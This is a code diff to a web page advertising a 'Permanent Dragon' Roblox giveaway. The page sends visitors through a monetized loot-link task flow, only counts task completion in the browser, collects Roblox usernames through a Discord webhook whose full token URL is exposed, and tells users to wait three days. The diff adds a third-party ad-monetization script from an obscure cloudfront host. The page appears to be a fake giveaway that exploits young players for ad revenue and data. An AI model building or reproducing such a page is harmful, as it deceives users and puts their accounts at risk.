@@ -138,13 +138,17 @@
         <a href="https://loot-link.com/s?7iPWPY6g" target="_blank">
             <button class="giveaway-button">💎 Complete Tasks</button>
         </a>
+
+        <!-- LootLabs Script for Monetization -->
+        <script data-cfasync="false" src="//dcbbwymp1bhlf.cloudfront.net/?wbbcd=1153940"></script>
+
         <div id="completion-status">Tasks Completed: 0/3</div>
         <div id="roblox-username-section" style="display:none;">
             <input type="text" id="roblox-username" placeholder="Enter your Roblox username">
             <button id="submit-username">Submit</button>
         </div>
         <div id="wait-message" style="display:none;">
-            <p>Please wait 3 days to receive your Permanent Dragon. notes:you wont get anything if you try to bypass it.</p>
+            <p>Please wait 3 days to receive your Permanent Dragon. Notes: You won’t get anything if you try to bypass it.</p>
         </div>
     </section>
 
@@ -164,7 +168,6 @@
     const robloxUsernameSection = document.getElementById('roblox-username-section');
     const waitMessage = document.getElementById('wait-message');
 
-    // Simulate task completion securely
     function completeTask() {
         if (taskCompletion < 3) {
             taskCompletion++;
@@ -187,9 +190,7 @@
 
             fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
                         title: "Permanent Dragon Claim",
